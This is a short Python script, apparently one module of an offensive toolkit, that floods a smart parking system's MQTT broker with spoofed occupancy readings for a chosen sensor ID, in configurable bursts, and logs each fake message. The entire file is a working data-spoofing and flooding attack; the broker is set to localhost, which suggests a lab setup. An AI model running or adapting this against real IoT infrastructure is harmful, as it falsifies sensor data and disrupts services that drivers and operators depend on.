#!/usr/bin/env python3
# modules/attacks/smart_parking_sensor_spammer.py

import paho.mqtt.publish as publish
import argparse
import time
import random
import os
import json

BROKER = "127.0.0.1"
TOPIC = "parking/sensors/"
LOG = "results/parking_spam.log"

def log(msg):
    os.makedirs("results", exist_ok=True)
    with open(LOG, "a") as f:
        f.write(f"{time.ctime()} | {msg}\n")
    print(msg)

def spam_sensors(sensor_id, fake_value, burst):
    for _ in range(burst):
        payload = {
            "sensor_id": sensor_id,
            "timestamp": time.time(),
            "value": fake_value,
            "spoofed": True
        }
        try:
            publish.single(TOPIC + sensor_id, json.dumps(payload), hostname=BROKER)
            log(f"Sent fake sensor reading: {payload}")
        except Exception as e:
            log(f"[ERROR] Failed to publish: {e}")
        time.sleep(0.2)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Spam smart parking sensors with spoofed data")
    parser.add_argument("--sensor", required=True, help="Sensor ID to target")
    parser.add_argument("--value", type=int, default=1, help="Fake occupancy value (1=occupied, 0=free)")
    parser.add_argument("--burst", type=int, default=10, help="Number of spoofed messages to send")
    args = parser.parse_args()
    spam_sensors(args.sensor, args.value, args.burst)
